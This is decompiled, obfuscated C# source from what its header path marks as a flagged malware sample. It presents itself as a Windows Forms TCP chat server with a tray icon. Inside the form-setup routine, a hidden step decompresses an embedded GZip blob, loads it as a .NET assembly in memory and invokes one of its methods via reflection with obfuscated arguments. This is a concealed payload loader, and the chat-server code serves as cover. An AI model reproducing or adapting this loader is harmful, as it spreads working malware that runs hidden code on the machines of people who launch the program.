// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Ud, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 6115513F-7820-43EE-DF09-7993E64971BD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\UDS-DangerousObject.Multi.Generic-25cd952df9c74033229ec91a5da330e392390ca6120db46d9ab21d3120c9011c.exe

using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public sealed class \u0002\u2004 : Form
{
  private Socket \u0002;
  private ArrayList \u0003;
  private Socket \u0005;
  private IContainer \u0008 = (IContainer) null;
  private static \u0002\u2004 \u0006;
  private ListBox \u000E;
  private Label \u000F;
  private Label \u0002\u2000;
  private TextBox \u0003\u2000;
  private TextBox \u0005\u2000;
  private Button \u0008\u2000;
  private StatusStrip \u0006\u2000;
  private ToolStripProgressBar \u000E\u2000;
  private ToolStripStatusLabel \u000F\u2000;
  private NotifyIcon \u0002\u2001;
  private ContextMenuStrip \u0003\u2001;
  private ToolStripMenuItem \u0005\u2001;
  private ToolStripMenuItem \u0008\u2001;
  private ToolStripMenuItem \u0006\u2001;

  public \u0002\u2004() => this.\u0008();

  private void \u0002(object _param1, EventArgs _param2)
  {
    this.\u0003 = new ArrayList();
    this.\u000E\u2000.Visible = false;
    this.\u000F\u2000.Visible = false;
  }

  private void \u0002()
  {
    try
    {
      IPEndPoint localEP = new IPEndPoint(IPAddress.Parse(this.\u0005\u2000.Text), int.Parse(this.\u0003\u2000.Text));
      this.\u0002 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      this.\u0002.Bind((EndPoint) localEP);
      this.\u0002.Listen(10);
      while (true)
      {
        try
        {
          this.\u0005 = this.\u0002.Accept();
        }
        catch (Exception ex)
        {
          int num = (int) MessageBox.Show(\u0008\u2006.\u0002(649712431) + ex.Message + \u0008\u2006.\u0002(649712607) + ex.ToString(), \u0008\u2006.\u0002(649712590), MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
      }
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(\u0008\u2006.\u0002(649712431) + ex.Message + \u0008\u2006.\u0002(649712607) + ex.ToString(), \u0008\u2006.\u0002(649712590), MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }
  }

  private void \u0003()
  {
    Socket socket = this.\u0005;
    bool flag1 = true;
    while (flag1)
    {
      try
      {
        byte[] numArray = new byte[1024];
        socket.Receive(numArray);
        string str1 = Encoding.UTF8.GetString(numArray);
        string[] strArray = str1.Split('|');
        Console.WriteLine(str1);
        if (strArray[0] == \u0008\u2006.\u0002(649712634))
        {
          for (int index = 0; index < this.\u0003.Count; ++index)
            this.\u0003((\u000F\u2001) this.\u0003[index], \u0008\u2006.\u0002(649712615) + strArray[1]);
          EndPoint remoteEndPoint = socket.RemoteEndPoint;
          \u000F\u2001 obj = new \u000F\u2001(strArray[1], remoteEndPoint, socket);
          this.\u0003.Add((object) obj);
          string str2 = \u0008\u2006.\u0002(649712531) + this.\u0002() + \u0008\u2006.\u0002(649712543);
          this.\u0003(obj, str2);
          this.\u0002(obj, \u0008\u2006.\u0002(649712518));
        }
        if (strArray[0] == \u0008\u2006.\u0002(649712560))
        {
          for (int index = 0; index < this.\u0003.Count; ++index)
            this.\u0003((\u000F\u2001) this.\u0003[index], str1);
        }
        if (strArray[0] == \u0008\u2006.\u0002(649712573))
        {
          string str3 = strArray[3];
          for (int index = 0; index < this.\u0003.Count; ++index)
          {
            \u000F\u2001 obj = (\u000F\u2001) this.\u0003[index];
            if (obj.\u0002().CompareTo(strArray[3]) == 0)
              this.\u0003(obj, str1);
            if (obj.\u0002().CompareTo(strArray[1]) == 0)
              this.\u0003(obj, str1);
          }
        }
        if (strArray[0] == \u0008\u2006.\u0002(649712550))
        {
          int index1 = 0;
          bool flag2 = false;
          int count = this.\u0003.Count;
          for (int index2 = 0; index2 < count; ++index2)
          {
            \u000F\u2001 obj = (\u000F\u2001) this.\u0003[index2];
            this.\u0003(obj, str1);
            if (obj.\u0002().CompareTo(strArray[1]) == 0)
            {
              index1 = index2;
              flag2 = true;
              this.\u0002(obj, \u0008\u2006.\u0002(649712723));
            }
          }
          if (flag2)
            this.\u0003.RemoveAt(index1);
          socket.Close();
          flag1 = false;
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(\u0008\u2006.\u0002(649712431) + ex.Message + \u0008\u2006.\u0002(649712607) + ex.ToString(), \u0008\u2006.\u0002(649712590), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
    }
  }

  private void \u0002(\u000F\u2001 _param1, string _param2)
  {
    if (this.\u000E.InvokeRequired)
      this.Invoke((Delegate) new \u0002\u2004.\u0002(this.\u0002), (object) _param1, (object) _param2);
    else if (_param2 == \u0008\u2006.\u0002(649712723))
      this.\u000E.Items.Remove((object) _param1);
    else
      this.\u000E.Items.Add((object) _param1);
  }

  private void \u0003(\u000F\u2001 _param1, string _param2)
  {
    try
    {
      byte[] bytes = Encoding.UTF8.GetBytes(_param2.ToCharArray());
      _param1.\u0002().Send(bytes, bytes.Length, SocketFlags.None);
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(\u0008\u2006.\u0002(649712431) + ex.Message + \u0008\u2006.\u0002(649712607) + ex.ToString(), \u0008\u2006.\u0002(649712590), MessageBoxButtons.OK, MessageBoxIcon.Hand);
      _param1.\u0002().Close();
      this.\u0003.Remove((object) _param1);
      this.\u000E.Items.Remove((object) (_param1.\u0002() + \u0008\u2006.\u0002(649712421) + _param1.\u0002().ToString()));
    }
  }

  private string \u0002()
  {
    string str = string.Empty;
    for (int index = 0; index < this.\u0003.Count; ++index)
    {
      \u000F\u2001 obj = (\u000F\u2001) this.\u0003[index];
      str = str + obj.\u0002() + \u0008\u2006.\u0002(649712734);
    }
    str.Trim('|');
    return str;
  }

  private void \u0003(object _param1, EventArgs _param2)
  {
    if (this.\u0008\u2000.Text == \u0008\u2006.\u0002(649712710))
    {
      this.\u000E\u2000.Visible = true;
      this.\u000F\u2000.Visible = true;
      this.\u0008\u2000.Text = \u0008\u2006.\u0002(649712756);
    }
    else
    {
      this.\u0008\u2000.Text = \u0008\u2006.\u0002(649712710);
      this.\u0005();
    }
    this.\u0002\u2001.Visible = true;
    this.\u0002\u2001.ShowBalloonTip(500, \u0008\u2006.\u0002(649712736), \u0008\u2006.\u0002(649712658), ToolTipIcon.Info);
  }

  private void \u0002(object _param1, FormClosingEventArgs _param2)
  {
    switch (_param2.CloseReason)
    {
      case CloseReason.None:
        _param2.Cancel = false;
        this.\u0005();
        break;
      case CloseReason.WindowsShutDown:
        _param2.Cancel = false;
        this.\u0005();
        break;
      case CloseReason.MdiFormClosing:
        _param2.Cancel = true;
        break;
      case CloseReason.UserClosing:
        _param2.Cancel = true;
        break;
      case CloseReason.TaskManagerClosing:
        this.\u0005();
        _param2.Cancel = false;
        break;
      case CloseReason.FormOwnerClosing:
        _param2.Cancel = true;
        break;
      case CloseReason.ApplicationExitCall:
        this.\u0005();
        _param2.Cancel = false;
        break;
    }
    this.Hide();
    this.\u0002\u2001.Visible = true;
    this.\u0002\u2001.ShowBalloonTip(500, \u0008\u2006.\u0002(649712736), \u0008\u2006.\u0002(649712699), ToolTipIcon.Info);
  }

  private void \u0005()
  {
    try
    {
      for (int index = 0; index < this.\u0003.Count; ++index)
      {
        \u000F\u2001 obj = (\u000F\u2001) this.\u0003[index];
        this.\u0003(obj, \u0008\u2006.\u0002(649712854));
        obj.\u0002().Close();
      }
    }
    catch (ThreadAbortException ex)
    {
      int num = (int) MessageBox.Show(\u0008\u2006.\u0002(649712431) + ex.Message + \u0008\u2006.\u0002(649712607) + ex.ToString(), \u0008\u2006.\u0002(649712590), MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }
  }

  private void \u0005(object _param1, EventArgs _param2)
  {
    if (this.WindowState != FormWindowState.Minimized)
      return;
    this.Hide();
    this.\u0002\u2001.Visible = true;
  }

  private void \u0002(object _param1, MouseEventArgs _param2)
  {
  }

  private void \u0008(object _param1, EventArgs _param2)
  {
    this.Show();
    this.WindowState = FormWindowState.Normal;
    this.\u0002\u2001.Visible = false;
  }

  private void \u0006(object _param1, EventArgs _param2) => Application.Restart();

  private void \u000E(object _param1, EventArgs _param2) => Application.Exit();

  protected override void Dispose(bool _param1)
  {
    if (_param1 && this.\u0008 != null)
      this.\u0008.Dispose();
    base.Dispose(_param1);
  }

  private void \u0008()
  {
    this.\u0008 = (IContainer) new Container();
    this.\u000E = new ListBox();
    this.\u000F = new Label();
    this.\u0002\u2000 = new Label();
    this.\u0003\u2000 = new TextBox();
    this.\u0005\u2000 = new TextBox();
    this.\u0008\u2000 = new Button();
    this.\u0006\u2000 = new StatusStrip();
    this.\u000F\u2000 = new ToolStripStatusLabel();
    this.\u000E\u2000 = new ToolStripProgressBar();
    this.\u0002\u2001 = new NotifyIcon(this.\u0008);
    this.\u0003\u2001 = new ContextMenuStrip(this.\u0008);
    this.\u0005\u2001 = new ToolStripMenuItem();
    this.\u0008\u2001 = new ToolStripMenuItem();
    this.\u0006\u2001 = new ToolStripMenuItem();
    this.\u0006\u2000.SuspendLayout();
    this.\u0003\u2001.SuspendLayout();
    this.\u0006();
    this.\u000E.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left;
    this.\u000E.Font = new Font(\u0008\u2006.\u0002(649712834), 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.\u000E.ItemHeight = 16;
    this.\u000E.Location = new Point(12, 50);
    this.\u000E.Name = \u0008\u2006.\u0002(649712881);
    this.\u000E.Size = new Size(363, 292);
    this.\u000E.TabIndex = 1;
    this.\u000F.AutoSize = true;
    this.\u000F.Location = new Point(133, 4);
    this.\u000F.Name = \u0008\u2006.\u0002(649712865);
    this.\u000F.Size = new Size(38, 13);
    this.\u000F.TabIndex = 34;
    this.\u000F.Text = \u0008\u2006.\u0002(649712876);
    this.\u0002\u2000.AutoSize = true;
    this.\u0002\u2000.Location = new Point(14, 5);
    this.\u0002\u2000.Name = \u0008\u2006.\u0002(649712795);
    this.\u0002\u2000.Size = new Size(46, 13);
    this.\u0002\u2000.TabIndex = 33;
    this.\u0002\u2000.Text = \u0008\u2006.\u0002(649712774);
    this.\u0003\u2000.Location = new Point(131, 20);
    this.\u0003\u2000.Name = \u0008\u2006.\u0002(649712823);
    this.\u0003\u2000.Size = new Size(40, 20);
    this.\u0003\u2000.TabIndex = 32;
    this.\u0003\u2000.Text = \u0008\u2006.\u0002(649712807);
    this.\u0005\u2000.Location = new Point(17, 21);
    this.\u0005\u2000.Name = \u0008\u2006.\u0002(649712976);
    this.\u0005\u2000.Size = new Size(95, 20);
    this.\u0005\u2000.TabIndex = 31;
    this.\u0005\u2000.Text = \u0008\u2006.\u0002(649712962);
    this.\u0008\u2000.Location = new Point(190, 17);
    this.\u0008\u2000.Name = \u0008\u2006.\u0002(649713012);
    this.\u0008\u2000.Size = new Size(80, 24);
    this.\u0008\u2000.TabIndex = 30;
    this.\u0008\u2000.Text = \u0008\u2006.\u0002(649712710);
    this.\u0008\u2000.Click += new EventHandler(this.\u0003);
    this.\u0006\u2000.Items.AddRange(new ToolStripItem[2]
    {
      (ToolStripItem) this.\u000F\u2000,
      (ToolStripItem) this.\u000E\u2000
    });
    this.\u0006\u2000.Location = new Point(0, 354);
    this.\u0006\u2000.Name = \u0008\u2006.\u0002(649712999);
    this.\u0006\u2000.Size = new Size(387, 22);
    this.\u0006\u2000.TabIndex = 35;
    this.\u0006\u2000.Text = \u0008\u2006.\u0002(649712999);
    this.\u000F\u2000.Name = \u0008\u2006.\u0002(649712920);
    this.\u000F\u2000.Size = new Size(134, 17);
    this.\u000F\u2000.Text = \u0008\u2006.\u0002(649712948);
    this.\u000E\u2000.Name = \u0008\u2006.\u0002(649713106);
    this.\u000E\u2000.Size = new Size(100, 16);
    this.\u000E\u2000.Style = ProgressBarStyle.Marquee;
    this.\u0002\u2001.BalloonTipIcon = ToolTipIcon.Info;
    this.\u0002\u2001.BalloonTipText = \u0008\u2006.\u0002(649713102);
    this.\u0002\u2001.BalloonTipTitle = \u0008\u2006.\u0002(649713043);
    this.\u0002\u2001.ContextMenuStrip = this.\u0003\u2001;
    this.\u0002\u2001.Text = \u0008\u2006.\u0002(649713080);
    this.\u0002\u2001.Visible = true;
    this.\u0002\u2001.MouseDoubleClick += new MouseEventHandler(this.\u0002);
    this.\u0003\u2001.Items.AddRange(new ToolStripItem[3]
    {
      (ToolStripItem) this.\u0005\u2001,
      (ToolStripItem) this.\u0008\u2001,
      (ToolStripItem) this.\u0006\u2001
    });
    this.\u0003\u2001.Name = \u0008\u2006.\u0002(649713246);
    this.\u0003\u2001.Size = new Size(120, 70);
    this.\u0005\u2001.Name = \u0008\u2006.\u0002(649713270);
    this.\u0005\u2001.Size = new Size(119, 22);
    this.\u0005\u2001.Text = \u0008\u2006.\u0002(649713252);
    this.\u0005\u2001.Click += new EventHandler(this.\u0008);
    this.\u0008\u2001.Name = \u0008\u2006.\u0002(649713168);
    this.\u0008\u2001.Size = new Size(119, 22);
    this.\u0008\u2001.Text = \u0008\u2006.\u0002(649713154);
    this.\u0008\u2001.Click += new EventHandler(this.\u0006);
    this.\u0006\u2001.Name = \u0008\u2006.\u0002(649713202);
    this.\u0006\u2001.Size = new Size(119, 22);
    this.\u0006\u2001.Text = \u0008\u2006.\u0002(649713361);
    this.\u0006\u2001.Click += new EventHandler(this.\u000E);
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(387, 376);
    this.Controls.Add((Control) this.\u0006\u2000);
    this.Controls.Add((Control) this.\u000F);
    this.Controls.Add((Control) this.\u0002\u2000);
    this.Controls.Add((Control) this.\u0003\u2000);
    this.Controls.Add((Control) this.\u0005\u2000);
    this.Controls.Add((Control) this.\u0008\u2000);
    this.Controls.Add((Control) this.\u000E);
    this.Name = \u0008\u2006.\u0002(649713373);
    this.Text = \u0008\u2006.\u0002(649713376);
    this.FormClosing += new FormClosingEventHandler(this.\u0002);
    this.Load += new EventHandler(this.\u0002);
    this.Resize += new EventHandler(this.\u0005);
    this.\u0006\u2000.ResumeLayout(false);
    this.\u0006\u2000.PerformLayout();
    this.\u0003\u2001.ResumeLayout(false);
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  private void \u0006() => \u0002\u2004.\u0002();

  private static void \u0002() => \u0002\u2004.\u0002(Assembly.Load(\u0002\u2004.\u0002(\u0002\u2006.\u0002())));

  internal static bool \u0002() => \u0002\u2004.\u0006 == null;

  internal static \u0002\u2004 \u0002() => \u0002\u2004.\u0006;

  public static byte[] \u0002(byte[] _param0)
  {
    MemoryStream memoryStream = new MemoryStream(_param0);
    GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress, true);
    List<byte> byteList = new List<byte>();
    int num = 2;
    while (true)
    {
      do
      {
        do
        {
          switch (num)
          {
            case 1:
              gzipStream.Close();
              memoryStream.Close();
              num = 0;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_8;
          }
        }
        while (\u0002\u2004.\u0002());
        break;
label_3:
        for (int index = gzipStream.ReadByte(); index != -1; index = gzipStream.ReadByte())
          byteList.Add((byte) index);
        gzipStream.Flush();
        memoryStream.Flush();
        num = 1;
      }
      while (\u0002\u2004.\u0002() == null);
      num = 0;
    }
label_8:
    return byteList.ToArray();
  }

  public static void \u0002(Assembly _param0) => Interaction.CallByName((object) _param0.GetType(\u0008\u2006.\u0002(649713283)).GetMethods()[3], \u0008\u2006.\u0002(649713327), CallType.Method, null, (object) new object[3]
  {
    (object) \u000F\u2005.\u0002,
    (object) \u000F\u2005.\u0003,
    (object) \u0008\u2006.\u0002(649713376)
  });

  private delegate void \u0002(\u000F\u2001 _param1, string _param2);
}
